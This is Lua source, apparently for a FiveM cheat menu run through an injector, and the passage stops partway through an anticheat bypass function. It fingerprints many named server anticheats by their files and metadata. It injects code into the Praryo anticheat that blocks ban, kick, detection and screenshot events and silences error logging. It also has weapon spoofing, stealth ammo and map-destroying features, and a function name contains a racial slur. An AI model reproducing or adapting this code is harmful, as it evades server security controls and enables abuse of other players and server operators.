Username = "BISAKLAT"
ExpDate = ""
local AutoLoadBypass = true
local FOCUS_AC_TYPES = { FGAC = true, ElectronAC = true, RybanAC = true, PraryoAC = true }
local WTPSHOP_DUI_BUILD = "20251007f"
local WTPSHOP_DUI_URL = "https://robinzxcc.github.io/wtpshop-dui/?v=" .. WTPSHOP_DUI_BUILD
---@diagnostic disable: undefined-global
local WTPSHOP = {}
WTPSHOP.SpoofWeaponActive = false
WTPSHOP.HandWeaponHash = 0
WTPSHOP.WeaponSpoofEnabled = false
WTPSHOP.AcMaskWeaponHash = GetHashKey("WEAPON_UNARMED")
WTPSHOP.InfiniteAmmoStealth = false
local _inventoryWeaponBypassInstalled = false
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local _uiElementsFlushScheduled = false
local _uiPendingElements = nil
local WeaponsLabels = {}
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local CurrentMapDestroyerIndex = 1
local CurrentSpawnObjectIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG", "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamMapDestroyerList = { "City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall", "Platform", "Big Ring", "Tube", "Dessert", "Goal", "Big Statue 2", "House" }
local FreecamSpawnObjectList = { "Big Tires", "Dome", "Black Surface", "Spinning Object", "Arena Fire", "Landmine", "Big Wheels", "Cnt Arena", "Arena Skull", "Arena Bomb", "Waste Rims" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Shoot Vehicle", "Map Destroyer", "Spawn Object", "Helicopter Attack" }
local FreecamHoveredIndex = 1
local fgawjFmaDjdALaO = false -- Super Strength
local fovEnabled = false
local fovShow = false
local fovRadius = 100
local MappedKeys = {
    [27] = "Escape", [112] = "F1", [113] = "F2",
    [114] = "F3", [115] = "F4", [116] = "F5",
    [117] = "F6", [118] = "F7", [119] = "F8",
    [120] = "F9", [121] = "F10", [122] = "F11",
    [123] = "F12", [192] = "`",
    [49] = "1", [50] = "2", [51] = "3",
    [52] = "4", [53] = "5", [54] = "6",
    [55] = "7", [56] = "8", [57] = "9",
    [48] = "0", [189] = "-", [187] = "=",
    [8] = "Backspace", [9] = "Tab", [81] = "Q",
    [87] = "W", [69] = "E", [82] = "R",
    [84] = "T", [89] = "Y", [85] = "U",
    [73] = "I", [79] = "O", [80] = "P",
    [219] = "[", [221] = "]", [220] = "\\",
    [20] = "CapsLock", [65] = "A", [83] = "S",
    [68] = "D", [70] = "F", [71] = "G",
    [72] = "H", [74] = "J", [75] = "K",
    [76] = "L", [186] = ";", [222] = "'",
    [13] = "Enter", [16] = "Shift", [90] = "Z",
    [88] = "X", [67] = "C", [86] = "V",
    [66] = "B", [78] = "N", [77] = "M",
    [188] = ",", [190] = ".", [191] = "/",
    [17] = "Control", [46] = "Delete", [33] = "PageUp",
    [34] = "PageDown", [35] = "End", [36] = "Home",
    [38] = "ArrowUp", [40] = "ArrowDown", [37] = "ArrowLeft", [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322,    -- Escape
    [112] = 288,   -- F1
    [113] = 289,   -- F2
    [114] = 170,   -- F3
    [115] = 167,   -- F4
    [116] = 166,   -- F5
    [117] = 167,   -- F6
    [118] = 168,   -- F7
    [119] = 169,   -- F8
    [120] = 56,    -- F9
    [121] = 57,    -- F10
    [122] = 344,   -- F11
    [123] = 345,   -- F12
    [192] = 243,   -- `
    [49] = 157,    -- 1
    [50] = 158,    -- 2
    [51] = 160,    -- 3
    [52] = 164,    -- 4
    [53] = 165,    -- 5
    [54] = 159,    -- 6
    [55] = 161,    -- 7
    [56] = 162,    -- 8
    [57] = 163,    -- 9
    [48] = 82,     -- 0
    [189] = 84,    -- -
    [187] = 83,    -- =
    [8] = 177,     -- Backspace
    [9] = 37,      -- Tab
    [81] = 44,     -- Q
    [87] = 32,     -- W
    [69] = 46,     -- E
    [82] = 45,     -- R
    [84] = 245,    -- T
    [89] = 246,    -- Y
    [85] = 303,    -- U
    [73] = 74,     -- I
    [79] = 199,    -- O
    [80] = 7,      -- P
    [219] = 39,    -- [
    [221] = 40,    -- ]
    [220] = 36,    -- \
    [20] = 137,    -- CapsLock
    [65] = 34,     -- A
    [83] = 33,     -- S
    [68] = 30,     -- D
    [70] = 49,     -- F
    [71] = 47,     -- G
    [72] = 74,     -- H
    [74] = 311,    -- J
    [75] = 311,    -- K
    [76] = 7,      -- L
    [186] = 81,    -- ;
    [222] = 82,    -- '
    [13] = 18,     -- Enter
    [16] = 21,     -- Shift
    [90] = 20,     -- Z
    [88] = 73,     -- X
    [67] = 26,     -- C
    [86] = 0,      -- V
    [66] = 29,     -- B
    [78] = 249,    -- N
    [77] = 244,    -- M
    [188] = 82,    -- ,
    [190] = 81,    -- .
    [191] = 83,    -- /
    [17] = 36,     -- Control
    [46] = 178,    -- Delete
    [33] = 10,     -- PageUp
    [34] = 11,     -- PageDown
    [35] = 213,    -- End
    [36] = 213,    -- Home
    [38] = 27,     -- ArrowUp
    [40] = 173,    -- ArrowDown
    [37] = 174,    -- ArrowLeft
    [39] = 175     -- ArrowRight
}


local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = {label = "Unarmed", hash = GetHashKey("weapon_unarmed")},
    ["weapon_knife"] = {label = "Knife", hash = GetHashKey("weapon_knife")},
    ["weapon_dagger"] = {label = "Dagger", hash = GetHashKey("weapon_dagger")},
    ["weapon_bat"] = {label = "Baseball Bat", hash = GetHashKey("weapon_bat")},
    ["weapon_bottle"] = {label = "Broken Bottle", hash = GetHashKey("weapon_bottle")},
    ["weapon_crowbar"] = {label = "Crowbar", hash = GetHashKey("weapon_crowbar")},
    ["weapon_golfclub"] = {label = "Golf Club", hash = GetHashKey("weapon_golfclub")},
    ["weapon_hammer"] = {label = "Hammer", hash = GetHashKey("weapon_hammer")},
    ["weapon_hatchet"] = {label = "Hatchet", hash = GetHashKey("weapon_hatchet")},
    ["weapon_machete"] = {label = "Machete", hash = GetHashKey("weapon_machete")},
    ["weapon_switchblade"] = {label = "Switchblade", hash = GetHashKey("weapon_switchblade")},
    ["weapon_nightstick"] = {label = "Nightstick", hash = GetHashKey("weapon_nightstick")},
    ["weapon_wrench"] = {label = "Wrench", hash = GetHashKey("weapon_wrench")},

    -- Handguns
    ["weapon_pistol"] = {label = "Pistol", hash = GetHashKey("weapon_pistol")},
    ["weapon_pistol_mk2"] = {label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2")},
    ["weapon_combatpistol"] = {label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol")},
    ["weapon_appistol"] = {label = "AP Pistol", hash = GetHashKey("weapon_appistol")},
    ["weapon_stungun"] = {label = "Taser", hash = GetHashKey("weapon_stungun")},
    ["weapon_pistol50"] = {label = "Pistol .50", hash = GetHashKey("weapon_pistol50")},
    ["weapon_snspistol"] = {label = "SNS Pistol", hash = GetHashKey("weapon_snspistol")},
    ["weapon_heavypistol"] = {label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol")},
    ["weapon_vintagepistol"] = {label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol")},
    ["weapon_flaregun"] = {label = "Flare Gun", hash = GetHashKey("weapon_flaregun")},

    -- SMGs
    ["weapon_microsmg"] = {label = "Micro SMG", hash = GetHashKey("weapon_microsmg")},
    ["weapon_smg"] = {label = "SMG", hash = GetHashKey("weapon_smg")},
    ["weapon_smg_mk2"] = {label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2")},
    ["weapon_assaultsmg"] = {label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg")},
    ["weapon_machinepistol"] = {label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol")},
    ["weapon_minismg"] = {label = "Mini SMG", hash = GetHashKey("weapon_minismg")},
    ["weapon_combatpdw"] = {label = "Combat PDW", hash = GetHashKey("weapon_combatpdw")},

    -- Rifles
    ["weapon_assaultrifle"] = {label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle")},
    ["weapon_assaultrifle_mk2"] = {label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2")},
    ["weapon_carbinerifle"] = {label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle")},
    ["weapon_carbinerifle_mk2"] = {label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2")},
    ["weapon_advancedrifle"] = {label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle")},
    ["weapon_specialcarbine"] = {label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine")},
    ["weapon_bullpuprifle"] = {label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle")},
    ["weapon_bullpuprifle_mk2"] = {label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2")},
    ["weapon_compactrifle"] = {label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle")},
    ["weapon_marksmanrifle"] = {label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle")},

    -- Shotguns
    ["weapon_pumpshotgun"] = {label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun")},
    ["weapon_pumpshotgun_mk2"] = {label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2")},
    ["weapon_sawnoffshotgun"] = {label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun")},
    ["weapon_assaultshotgun"] = {label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun")},
    ["weapon_bullpupshotgun"] = {label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun")},
    ["weapon_heavyshotgun"] = {label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun")},
    ["weapon_autoshotgun"] = {label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun")},

    -- Snipers
    ["weapon_sniperrifle"] = {label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle")},
    ["weapon_heavysniper"] = {label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper")},
    ["weapon_heavysniper_mk2"] = {label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2")},
    ["weapon_marksmanrifle_mk2"] = {label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2")},

    -- Explosives / Launchers
    ["weapon_grenade"] = {label = "Grenade", hash = GetHashKey("weapon_grenade")},
    ["weapon_stickybomb"] = {label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb")},
    ["weapon_molotov"] = {label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov")},
    ["weapon_pipebomb"] = {label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb")},
    ["weapon_proxmine"] = {label = "Proximity Mine", hash = GetHashKey("weapon_proxmine")},
    ["weapon_rpg"] = {label = "RPG", hash = GetHashKey("weapon_rpg")},
    ["weapon_grenadelauncher"] = {label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher")},
    ["weapon_hominglauncher"] = {label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher")},
    ["weapon_minigun"] = {label = "Minigun", hash = GetHashKey("weapon_minigun")},
    ["weapon_railgun"] = {label = "Railgun", hash = GetHashKey("weapon_railgun")},

    -- Throwables / Misc
    ["weapon_ball"] = {label = "Baseball", hash = GetHashKey("weapon_ball")},
    ["weapon_smokegrenade"] = {label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade")},
    ["weapon_flare"] = {label = "Flare", hash = GetHashKey("weapon_flare")},
    ["weapon_petrolcan"] = {label = "Jerry Can", hash = GetHashKey("weapon_petrolcan")},
    ["weapon_bzgas"] = {label = "BZ Gas", hash = GetHashKey("weapon_bzgas")}
}

local function initWeaponsLabels()
    for model, data in pairs(WeaponList) do
        WeaponsLabels[data.hash] = (model == "weapon_unarmed") and "Fists" or data.label
    end
    local weaponDisplayExtras = {
        ["weapon_snspistol_mk2"] = "SNS Pistol Mk II",
        ["weapon_ceramicpistol"] = "Ceramic Pistol",
        ["weapon_revolver_mk2"] = "Heavy Revolver Mk II",
        ["weapon_doubleaction"] = "Double-Action Revolver",
        ["weapon_gadgetpistol"] = "Gadget Pistol",
        ["weapon_pistolxm3"] = "WM 29 Pistol",
        ["weapon_specialcarbine_mk2"] = "Special Carbine Mk II",
        ["weapon_militaryrifle"] = "Military Rifle",
        ["weapon_tacticalrifle"] = "Service Carbine",
        ["weapon_battlerifle"] = "Battle Rifle",
        ["weapon_mg"] = "MG",
        ["weapon_combatmg"] = "Combat MG",
        ["weapon_hackingdevice"] = "Hacking Device",
        ["weapon_stungun_mp"] = "Stun Gun MP",
        ["weapon_fireextinguisher"] = "Fire Extinguisher",
        ["weapon_gusenberg"] = "Gusenberg Sweeper",
        ["weapon_firework"] = "Firework Launcher",
        ["weapon_musket"] = "Musket",
        ["weapon_snowball"] = "Snowball",
        ["weapon_garbagebag"] = "Garbage Bag",
        ["weapon_handcuffs"] = "Handcuffs",
        ["weapon_marksmanpistol"] = "Marksman Pistol",
        ["weapon_knuckle"] = "Knuckle Dusters",
        ["weapon_revolver"] = "Heavy Revolver",
        ["weapon_heavyrifle"] = "Heavy Rifle",
        ["weapon_dbshotgun"] = "Double Barrel Shotgun",
        ["weapon_battleaxe"] = "Battle Axe",
        ["weapon_compactlauncher"] = "Compact Grenade Launcher",
        ["weapon_poolcue"] = "Pool Cue",
        ["weapon_bread"] = "Piece of Bread",
        ["weapon_stone_hatchet"] = "Stone Hatchet",
        ["weapon_rayminigun"] = "Unholy Hellbringer",
        ["weapon_raycarbine"] = "Widowmaker",
        ["weapon_compactgrenadelauncher"] = "Compact Grenade Launcher",
        ["weapon_smugglerpistol"] = "Up-n-Atomizer",
        ["weapon_raypistol"] = "Up-n-Atomizer",
        ["weapon_perico_pistol"] = "Ceramic Pistol",
        ["weapon_combatmg_mk2"] = "Combat MG Mk II",
        ["weapon_raycarbine_mk2"] = "Widowmaker Mk II",
        ["weapon_flashlight"] = "Flashlight",
        ["weapon_hazardousknife"] = "Hazardous Knife",
        ["weapon_navyrevolver"] = "Navy Revolver",
        ["weapon_golfball"] = "Golf Ball",
    }
    for model, label in pairs(weaponDisplayExtras) do
        WeaponsLabels[GetHashKey(model)] = label
    end
end
initWeaponsLabels()

local targetRes = (GetResourceState("lunar_fishing") == "started" and "lunar_fishing") or (GetResourceState("jg-advancedgarages") == "started" and "jg-advancedgarages") or (GetResourceState("jg-dealerships") == "started" and "jg-dealerships") or (GetResourceState("cd_garage") == "started" and "cd_garage") or (GetResourceState("cfx-bg-garages") == "started" and "cfx-bg-garages") or (GetResourceState("es_extended") == "started" and "es_extended") or "any"
local targetSafeRes = (GetResourceState("es_extended") == "started" and "es_extended") or (GetResourceState("ox_lib") == "started" and "ox_lib") or "any"

local IsDetections = GetResourceState("seph") == 'started' or GetResourceState("sxph_idsystem") == 'started'

local ApiRasclat = {
    ResourcesSTATESZ = {},
    strings = {
        StringFind = string.find,
        StringLower = string.lower
    },
}

CreateThread(function()
    for i = 0, GetNumResources() - 1 do
        local rName = GetResourceByFindIndex(i)
        if MachoResourceInjectable(rName) then
            ApiRasclat.ResourcesSTATESZ[#ApiRasclat.ResourcesSTATESZ + 1] = rName
        end
        Wait(0)
    end
end)

function ApiRasclat.NormalizeResource(res)
    if res == nil or res == "" or res == "any" then
        return "any"
    end
    return res
end

function ApiRasclat.TxResource()
    if GetResourceState("monitor") == "started" then
        return "monitor"
    end
    if GetResourceState("ox_lib") == "started" then
        return "ox_lib"
    end
    return "any"
end

local detectedAC = {}
local ACExceptionsType = {}
local ACExceptions = {}

function SafeStringFind(text, pattern)
    if text and type(text) == "string" then
        return ApiRasclat.strings.StringFind(text, pattern)
    end
    return false
end

function Titenibongzi(res, payload)
    return MachoInjectResourceRaw(res, payload)
end

local function makepayloadnigga(code)
    local escaped = string.format("%q", code)
    return "load(" .. escaped .. ", '=-1')()"
end

local detectedAcKeys = {}
local _frameworkLogged = { esx = false, qb = false }

local function acDetectKey(acType, resource)
    return (acType or "") .. "|" .. (resource or "")
end

local function addDetectedAc(entry)
    if not entry or not entry.type or not entry.resource then
        return false
    end
    local key = acDetectKey(entry.type, entry.resource)
    if detectedAcKeys[key] then
        return false
    end
    detectedAcKeys[key] = true
    detectedAC[#detectedAC + 1] = entry
    return true
end

local function serverHasFocusAcDetected()
    for _, ac in ipairs(detectedAC) do
        if FOCUS_AC_TYPES[ac.type] then
            return true
        end
    end
    return false
end

local function applyFocusAcModeAfterScan()
    if not serverHasFocusAcDetected() then
        return
    end
    local filtered = {}
    local keys = {}
    for _, ac in ipairs(detectedAC) do
        if FOCUS_AC_TYPES[ac.type] then
            filtered[#filtered + 1] = ac
            keys[acDetectKey(ac.type, ac.resource)] = true
        end
    end
    detectedAC = filtered
    detectedAcKeys = keys
end

local function hasDetectedAcOnResource(resource, acType)
    return detectedAcKeys[acDetectKey(acType, resource)] == true
end

function ApiRasclat.ScanResourceAnticheat(resource)
    if not resource then
        return detectedAC
    end
    if resource:match('es_extended') and not _frameworkLogged.esx then
        _frameworkLogged.esx = true
        print("ESX FRAMEWORK DETECTED", "info")
    end
    if (GetResourceMetadata(resource, "description", 0) == "QB-Core" or resource == 'qb-core') and not _frameworkLogged.qb then
        _frameworkLogged.qb = true
        print("QBCORE FRAMEWORK DETECTED", "info")
    end
            if LoadResourceFile(resource, "shared_fg-obfuscated.lua")
                or LoadResourceFile(resource, "ai_module_fg-obfuscated.lua")
                or LoadResourceFile(resource, "client/ai_module_fg-obfuscated.lua") then
                addDetectedAc({
                    name = "FiveGuard",
                    type = "FGAC",
                    resource = resource
                })
            end
            if not hasDetectedAcOnResource(resource, "FGAC") then
                local csCount = GetNumResourceMetadata(resource, "client_script") or 0
                for j = 0, csCount - 1 do
                    local meta = GetResourceMetadata(resource, "client_script", j)
                    if meta and type(meta) == "string" and meta:lower():find("obfuscated", 1, true) then
                        addDetectedAc({
                            name = "FiveGuard",
                            type = "FGAC",
                            resource = resource
                        })
                        break
                    end
                end
            end
            if (resource == 'cfx-cs-sentry') then
                addDetectedAc({
                    name = "Generic",
                    type = "SenAC",
                    resource = resource
                })
            end
            if (GetResourceMetadata(resource, "game", 0) == "gta5" and resource == 'amari-utils') then
                addDetectedAc({
                    name = "Generic",
                    type = "AAC",
                    resource = resource
                })
            end
            local lua54 = GetResourceMetadata(resource, "lua54", 0)
            local description = GetResourceMetadata(resource, "description", 0)
            local node_version = GetResourceMetadata(resource, "node_version", 0)
            if not hasDetectedAcOnResource(resource, "ElectronAC") then
                local _elMatch = 0
                if LoadResourceFile(resource, "src/client/main.lua") and LoadResourceFile(resource, "src/include/client.lua") then _elMatch = _elMatch + 3 end
                if LoadResourceFile(resource, "web/index.html") and LoadResourceFile(resource, "web/index.js") and LoadResourceFile(resource, "web/index.css") then _elMatch = _elMatch + 3 end
                if SafeStringFind(description, "The most advanced fiveM anticheat") then _elMatch = _elMatch + 2 end
                if SafeStringFind(GetResourceMetadata(resource, "author", 0), "Electron") then _elMatch = _elMatch + 1 end
                if SafeStringFind(node_version, "22") then _elMatch = _elMatch + 2 end
                if SafeStringFind(GetResourceMetadata(resource, "use_experimental_fxv2_oal", 0), "yes") then _elMatch = _elMatch + 2 end
                local _elHtml = LoadResourceFile(resource, "web/index.html")
                if _elHtml and SafeStringFind(_elHtml, "ViPMv7X0j1enaZDkTL2bI8E3FPXCgJ4w") then _elMatch = _elMatch + 4 end
                if _elMatch >= 6 then
                    addDetectedAc({
                        name = "ElectronAC",
                        type = "ElectronAC",
                        resource = resource
                    })
                end
            end
            if lua54 == "yes" and SafeStringFind(description, "ZeroInject AC - minimal all-in-one bundle") and SafeStringFind(GetResourceMetadata(resource, "author", 0), "ZeroInject") then
                addDetectedAc({
                    name = "ZeroInject",
                    type = "ZeroInject",
                    resource = resource
                })
            end
            if not hasDetectedAcOnResource(resource, "RybanAC") then
                local _rbMatch = 0
                if LoadResourceFile(resource, "shared/secure-events.lua") and LoadResourceFile(resource, "client/heartbeat.lua") then _rbMatch = _rbMatch + 4 end
                if LoadResourceFile(resource, "modules/anti-godmode/client.lua") and LoadResourceFile(resource, "modules/anti-freecam/client.lua") and LoadResourceFile(resource, "modules/anti-coords/client.lua") then _rbMatch = _rbMatch + 3 end
                if LoadResourceFile(resource, "modules/anti-health-armour/client.lua") and LoadResourceFile(resource, "modules/anti-invisible/client.lua") then _rbMatch = _rbMatch + 2 end
                if LoadResourceFile(resource, "modules/anti-noclip/client.lua") then _rbMatch = _rbMatch + 1 end
                if SafeStringFind(description, "FiveM Server Protection") then _rbMatch = _rbMatch + 2 end
                if SafeStringFind(GetResourceMetadata(resource, "author", 0), "RrybaN") then _rbMatch = _rbMatch + 1 end
                if _rbMatch >= 6 then
                    addDetectedAc({
                        name = "Curt Security",
                        type = "RybanAC",
                        resource = resource
                    })
                end
            end
            if not hasDetectedAcOnResource(resource, "RybanAC") then
                local lowerRb = resource:lower()
                if lowerRb:find("^rryban_", 1, true) or lowerRb:find("_secure$", 1, true)
                    or lowerRb:find("curt", 1, true) or lowerRb == "rryban_secure" then
                    addDetectedAc({
                        name = "Ryban / Curt",
                        type = "RybanAC",
                        resource = resource
                    })
                end
            end
            if (resource == 'cfx-praryo-kernel' and lua54 == "yes" and SafeStringFind(GetResourceMetadata(resource, "author", 0), "Praryo")) then
                addDetectedAc({
                    name = "Praryo Security",
                    type = "PraryoAC",
                    resource = resource
                })
            end
            if (resource == 'cfx-kernel' and lua54 == "yes" and SafeStringFind(GetResourceMetadata(resource, "author", 0), "Praryo")) then
                addDetectedAc({
                    name = "Praryo Security",
                    type = "PraryoAC",
                    resource = resource
                })
            end
            if resource:match('ElectronAC') and not hasDetectedAcOnResource(resource, "ElectronAC") then
                if (SafeStringFind(GetResourceMetadata(resource, "author", 0), "Electron") and SafeStringFind(GetResourceMetadata(resource, "description", 0), "The most advanced fiveM anticheat.")) then
                    addDetectedAc({
                        name = "ElectronAC",
                        type = "ElectronAC",
                        resource = resource
                    })
                end
            end
            if not hasDetectedAcOnResource(resource, "WS") then
                local wsMatch = (resource == 'WaveShield' and SafeStringFind(GetResourceMetadata(resource, "author", 0), "WaveShield"))
                    or (LoadResourceFile(resource, "resource/waveshield.js") ~= nil
                        and SafeStringFind(GetResourceMetadata(resource, "author", 0) or "", "WaveShield"))
                if wsMatch then
                    addDetectedAc({
                        name = "WaveShield",
                        type = "WS",
                        resource = resource
                    })
                end
            end
            if (resource == 'VynxAC') then
                addDetectedAc({
                    name = "VynxAC",
                    type = "LeakDawAC",
                    resource = resource
                })
            end
            if resource == 'ReaperV4'
                or (resource:match("[Rr]eaper") and LoadResourceFile(resource, "classes/class.lua")) then
                addDetectedAc({ name = "ReaperV4", type = "ReaperV4", resource = resource })
            end
            if resource == 'FiniAC'
                or (LoadResourceFile(resource, "fini_events.js") and LoadResourceFile(resource, "fini_events.lua"))
                or (LoadResourceFile(resource, "anticheat.html") and LoadResourceFile(resource, "client/client.js")) then
                addDetectedAc({ name = "FiniAC", type = "FiniAC", resource = resource })
            end
            if LoadResourceFile(resource, "src/fire-client.lua") and LoadResourceFile(resource, "src/fire-menu.lua") then
                addDetectedAc({ name = "FireAC", type = "FireAC", resource = resource })
            end
            if LoadResourceFile(resource, "client/client-obfuscated.lua")
                and LoadResourceFile(resource, "client/functions-obfuscated.lua")
                and LoadResourceFile(resource, "data/hashes.json") then
                addDetectedAc({ name = "CyberAnticheat", type = "CyberAC", resource = resource })
            end
            if LoadResourceFile(resource, "source/client/crasher.lua") and LoadResourceFile(resource, "source/client/ocr.lua") then
                addDetectedAc({ name = "ReasonAC", type = "ReasonAC", resource = resource })
            end
            if LoadResourceFile(resource, "client/injections.lua") and LoadResourceFile(resource, "client/menu.lua") then
                addDetectedAc({ name = "GreekAC", type = "GreekAC", resource = resource })
            end
            local lowerRes = resource:lower()
            if lowerRes:find("wolfshield", 1, true) or lowerRes:find("antichix", 1, true) then
                addDetectedAc({ name = resource, type = "GenericAC", resource = resource })
            end
            if lowerRes == "baguvix" or lowerRes == "ec_ac" or lowerRes == "guidac"
                or lowerRes == "likizao_ac" or lowerRes == "feloxac" or lowerRes == "0t_ac"
                or lowerRes == "sniffac" or lowerRes == "wardenac" then
                addDetectedAc({ name = resource, type = "GenericAC", resource = resource })
            end
            if (LoadResourceFile(resource, "pam.obf.lua") or LoadResourceFile(resource, "dist/pam.obf.lua"))
                and (LoadResourceFile(resource, "pam.obf.js") or LoadResourceFile(resource, "dist/pam.html")) then
                addDetectedAc({ name = "PhoenixAC", type = "GenericAC", resource = resource })
            end
            if LoadResourceFile(resource, "dist/include.lua") and LoadResourceFile(resource, "dist/client.js")
                and LoadResourceFile(resource, "watch/web/index.html") then
                addDetectedAc({ name = "WardenAC", type = "GenericAC", resource = resource })
            end
            if resource == 'Eminence' then
                addDetectedAc({ name = "Eminence", type = "Eminence", resource = resource })
            end
            if resource == 'AegisX' then
                addDetectedAc({ name = "AegisX", type = "AegisX", resource = resource })
            end
    return detectedAC
end

function ApiRasclat.ScanAllAnticheats()
    local numResources = GetNumResources()
    for i = 0, numResources - 1 do
        ApiRasclat.ScanResourceAnticheat(GetResourceByFindIndex(i))
    end
    applyFocusAcModeAfterScan()
    return detectedAC
end

local _rybanSpoofRes = nil
local _rybanSpoofSrc = nil
local _praryoKernelRes = nil
local _praryoSpoofSrc = nil
local _praryoStaticRes = nil
local _praryoBypassLoaded = false

local function configurePraryoKernel(resource)
    if not resource then return end
    _praryoKernelRes = resource
    ACExceptions[resource] = true
    ACExceptionsType["PraryoAC"] = true
    for _, sat in ipairs({ "cfx-praryo-groups", "cfx-praryo-static", "ox_inventory", "ox_lib" }) do
        if GetResourceState(sat) == "started" then
            ACExceptions[sat] = true
        end
    end
    if LoadResourceFile(resource, ".fxap") then
        _praryoSpoofSrc = "=?"
    else
        _praryoSpoofSrc = nil
        local numClient = GetNumResourceMetadata(resource, "client_script") or 0
        for j = 0, numClient - 1 do
            local val = GetResourceMetadata(resource, "client_script", j)
            if val and val:find("%.lua") and not val:find("%*") then
                local srcRes = val:match("^@([^/]+)/")
                local filePath = val:match("^@[^/]+/(.+)$") or val
                if srcRes then
                    _praryoSpoofSrc = ("@@%s/%s"):format(srcRes, filePath)
                else
                    _praryoSpoofSrc = ("@@%s/%s"):format(resource, val)
                end
                break
            end
        end
    end
    if not _praryoSpoofSrc then
        _praryoSpoofSrc = "=?"
    end
end

local function loadPraryoBypass(res, force)
    if not res or GetResourceState(res) ~= "started" or not MachoInjectResourceScriptOverride then
        return false
    end
    local prKey = acBypassKey("PraryoAC", res)
    if (_praryoBypassLoaded or _acBypassLoaded[prKey]) and not force then
        return true
    end
    configurePraryoKernel(res)
    local _prRes = res
    local ok = pcall(MachoInjectResourceScriptOverride, 1, res, [[
        local praryoRasclatBypass = function()
            local origTSE = TriggerServerEvent
            local origRawset = rawset
            local origType = type
            local acRes = "]] .. _prRes .. [["
            local function blockAcEvent(evt)
                if origType(evt) ~= "string" then return false end
                if evt:find(acRes, 1, true) then return true end
                local e = evt:lower()
                return e:find("praryo", 1, true)
                    or e:find("cfx%-praryo", 1, true)
                    or e:find("nxgn", 1, true)
                    or e:find("kernel", 1, true)
                    or e:find("integrity", 1, true)
                    or e:find("anticheat", 1, true)
                    or e:find("executor", 1, true)
                    or e:find("punish", 1, true)
                    or e:find("detection", 1, true)
                    or e:find("screenshot", 1, true)
                    or e:find("record", 1, true)
                    or e:find(":ban", 1, true)
                    or e:find(":kick", 1, true)
            end
            origRawset(_G, "TriggerServerEvent", function(evt, ...)
                if blockAcEvent(evt) then return end
                return origTSE(evt, ...)
            end)
            TriggerServerEvent = _G.TriggerServerEvent
            if TriggerServerEventInternal then
                local origTSEI = TriggerServerEventInternal
                origRawset(_G, "TriggerServerEventInternal", function(evt, ...)
                    if blockAcEvent(evt) then return end
                    return origTSEI(evt, ...)
                end)
            end
            origRawset(_G, "error", function() end)
            if Citizen and Citizen.Trace then
                origRawset(Citizen, "Trace", function() end)
            end
        end
        praryoRasclatBypass();
    ]], '=?', 1, 100)
    if ok then
        markPraryoBypassLoaded(_prRes)
    end
    return ok
end

local function tryPraryoBypassOnJoin(force)
    local loaded = false
    for _, name in ipairs({ "cfx-praryo-kernel", "cfx-kernel" }) do
        if GetResourceState(name) == "started" then
            if loadPraryoBypass(name, force) then
                loaded = true
            end
        end
    end
    return loaded
end

local _acBypassLoaded = {}

local function acBypassKey(acType, resource)
    return acType .. "\x1e" .. (resource or "")
end

local function markPraryoBypassLoaded(kernelRes)
    _praryoBypassLoaded = true
    if kernelRes then
        _acBypassLoaded[acBypassKey("PraryoAC", kernelRes)] = true
    end
    for _, ac in ipairs(detectedAC) do
        if ac.type == "PraryoAC" then
            _acBypassLoaded[acBypassKey("PraryoAC", ac.resource)] = true
        end
    end
    for _, name in ipairs({ "cfx-praryo-kernel", "cfx-kernel" }) do
        if GetResourceState(name) == "started" then
            _acBypassLoaded[acBypassKey("PraryoAC", name)] = true
        end
    end
end

local function loadFgacBypass(resource, force)
    if not resource or GetResourceState(resource) ~= "started" or not MachoInjectResourceScriptOverride then
        return false
    end
